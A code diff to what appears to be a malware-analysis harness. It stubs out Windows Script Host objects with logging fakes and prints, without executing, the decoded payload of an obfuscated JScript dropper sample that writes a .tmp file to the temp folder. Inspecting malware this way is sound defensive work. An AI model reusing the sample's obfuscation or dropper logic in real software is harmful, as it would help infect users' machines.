@@ -1,50 +1,44 @@
-// dummy struct (the fake WScript)
-if(typeof(WScript) === "undefined") {
-    WScript = {
-        "CreateObject": function(arg1) {
-            return (function(arg1) {
-                return {
-                    "FileExists": function(_arg1) {
-                        console.log(arg1 + " -> FileExists(arg1): " + _arg1);
-                        return false;
-                    },
-                    "CreateTextFile": function(_arg1, _arg2) {
-                        console.log(arg1 + " -> CreateTextFile(arg1): " + _arg1);
-                        console.log(arg1 + " -> CreateTextFile(arg2): " + _arg2);
-                        return {
-                            "Close": function() {
-                                console.log(arg1 + " -> CreateTextFile -> Close"); 
-                            }
+var WScript = {
+    "CreateObject": function(arg1) {
+        return (function(arg1) {
+            return {
+                "FileExists": function(_arg1) {
+                    console.log(arg1 + " -> FileExists(arg1): " + _arg1);
+                    return false;
+                },
+                "CreateTextFile": function(_arg1, _arg2) {
+                    console.log(arg1 + " -> CreateTextFile(arg1): " + _arg1);
+                    console.log(arg1 + " -> CreateTextFile(arg2): " + _arg2);
+                    return {
+                        "Close": function() {
+                            console.log(arg1 + " -> CreateTextFile -> Close"); 
                         }
-                    },
-                    // https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/getspecialfolder-method
-                    "GetSpecialFolder": function(_arg1) {
-                        switch(_arg1) {
-                            case 0:
-                                console.log(arg1 + " -> GetSpecialFolder(WindowsFolder)");
-                                break;
-                            case 1:
-                                console.log(arg1 + " -> GetSpecialFolder(SystemFolder)");
-                                break;
-                            case 2:
-                                console.log(arg1 + " -> GetSpecialFolder(TemporaryFolder)");
-                            default:
-                                console.log(arg1 + " -> GetSpecialFolder(Nothing)");
-                        }
-                        
-                        return "C:\\temp"; 
                     }
+                },
+                // https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/getspecialfolder-method
+                "GetSpecialFolder": function(_arg1) {
+                    switch(_arg1) {
+                        case 0:
+                            console.log(arg1 + " -> GetSpecialFolder(WindowsFolder)");
+                            break;
+                        case 1:
+                            console.log(arg1 + " -> GetSpecialFolder(SystemFolder)");
+                            break;
+                        case 2:
+                            console.log(arg1 + " -> GetSpecialFolder(TemporaryFolder)");
+                        default:
+                            console.log(arg1 + " -> GetSpecialFolder(Nothing)");
+                    }
+                    
+                    return "C:\\temp"; 
                 }
-            })(arg1);
-        },
-        "Quit": function() {
-            console.log("Quit");
-        },
-        "Echo": function(arg1) {
-            console.log(arg1);
-        }
-    };
-}
+            }
+        })(arg1);
+    },
+    "Quit": function() {
+        console.log("Quit");
+    }
+};
 
 function pa4(Od47){
 Zr1=Od47; 
@@ -67,7 +61,6 @@ Wi87();
 Wv4();
 //uF26();
 
-// bypass nested obfuscated code
 constructorNOyZvbxs = '';
 HD25 = WScript.CreateObject("Scripting.FileSystemObject");
 YS45 = HD25["Ge" + "tSpe" + "ci" + "alF" + "olde" + "r"](4 - 2) + "\\ia836015.tmp";
@@ -79,9 +72,7 @@ while (Sl37 < 13200585) {
     Sl37 = Sl37 + 1;
 }
 
-WScript.Echo(Or64('FB(2 .fsit a}t u;se s=l=a=f  2n0r0u)t e{r  v{a)re (ehHc7t6a c=}  F;B)2(.drneessp.o2nBsFe T;e)xets;l aiff  ,(5(4eRHD7+6\".=iunpdvejxuOdff(y\"y@l\"p+tDiRj4?5\"++\"\'@p\"h,p .0n)i)a=m=/-\'1+)] 2{9 hWDS[c5r1inpFt+.\'s/l/e:eppt(t3h0\'0 0,0\')T;E G}\' (enlespeo .{2 BeFH 7{6y r=t  e;H)7063.+r0e7p,l2a(c]e\"(r\"t@s\"b+uDsR\"4[5)+(\"g@n\"i,r\"t\"S)o;t .v)a(rm oMdJn3a8r .=h teaHM7 6=. r5e4pRlDa c;e)(\'/P(T\\TdH{L2M}X)r/egv,r efSu.n2cLtMiXoSnM \'((itmc2e6j)b O{e traeetruCr.nt pSitrrciSnWg .=f r2oBmFC h{a r)C3o d<e (2p9ahrDs(e Ienlti(hiwm 2;60, 1=0 )2+93h0D) ;; ]}\")e;b .Krqe6t3s[p3p]e(wM.Jd3n8a)l(r)e;d eWnSrcertinpetc.yQtueifta(s)\";, \"}p j}. oecl.sset a{l pWnSicfr\"i,p\"tm.oscl.efelpo(g3-0u0s0a0y)u;k a}k \"D[h 9=2 +5+1;n}F '));
-
-// mission clear
+console.log(Or64('FB(2 .fsit a}t u;se s=l=a=f  2n0r0u)t e{r  v{a)re (ehHc7t6a c=}  F;B)2(.drneessp.o2nBsFe T;e)xets;l aiff  ,(5(4eRHD7+6\".=iunpdvejxuOdff(y\"y@l\"p+tDiRj4?5\"++\"\'@p\"h,p .0n)i)a=m=/-\'1+)] 2{9 hWDS[c5r1inpFt+.\'s/l/e:eppt(t3h0\'0 0,0\')T;E G}\' (enlespeo .{2 BeFH 7{6y r=t  e;H)7063.+r0e7p,l2a(c]e\"(r\"t@s\"b+uDsR\"4[5)+(\"g@n\"i,r\"t\"S)o;t .v)a(rm oMdJn3a8r .=h teaHM7 6=. r5e4pRlDa c;e)(\'/P(T\\TdH{L2M}X)r/egv,r efSu.n2cLtMiXoSnM \'((itmc2e6j)b O{e traeetruCr.nt pSitrrciSnWg .=f r2oBmFC h{a r)C3o d<e (2p9ahrDs(e Ienlti(hiwm 2;60, 1=0 )2+93h0D) ;; ]}\")e;b .Krqe6t3s[p3p]e(wM.Jd3n8a)l(r)e;d eWnSrcertinpetc.yQtueifta(s)\";, \"}p j}. oecl.sset a{l pWnSicfr\"i,p\"tm.oscl.efelpo(g3-0u0s0a0y)u;k a}k \"D[h 9=2 +5+1;n}F '));
 
 //Kq63[5 - 2](Or64('FB(2 .fsit a}t u;se s=l=a=f  2n0r0u)t e{r  v{a)re (ehHc7t6a c=}  F;B)2(.drneessp.o2nBsFe T;e)xets;l aiff  ,(5(4eRHD7+6\".=iunpdvejxuOdff(y\"y@l\"p+tDiRj4?5\"++\"\'@p\"h,p .0n)i)a=m=/-\'1+)] 2{9 hWDS[c5r1inpFt+.\'s/l/e:eppt(t3h0\'0 0,0\')T;E G}\' (enlespeo .{2 BeFH 7{6y r=t  e;H)7063.+r0e7p,l2a(c]e\"(r\"t@s\"b+uDsR\"4[5)+(\"g@n\"i,r\"t\"S)o;t .v)a(rm oMdJn3a8r .=h teaHM7 6=. r5e4pRlDa c;e)(\'/P(T\\TdH{L2M}X)r/egv,r efSu.n2cLtMiXoSnM \'((itmc2e6j)b O{e traeetruCr.nt pSitrrciSnWg .=f r2oBmFC h{a r)C3o d<e (2p9ahrDs(e Ienlti(hiwm 2;60, 1=0 )2+93h0D) ;; ]}\")e;b .Krqe6t3s[p3p]e(wM.Jd3n8a)l(r)e;d eWnSrcertinpetc.yQtueifta(s)\";, \"}p j}. oecl.sset a{l pWnSicfr\"i,p\"tm.oscl.efelpo(g3-0u0s0a0y)u;k a}k \"D[h 9=2 +5+1;n}F '))(Sl37);
 //ejavnsz = Kq63;
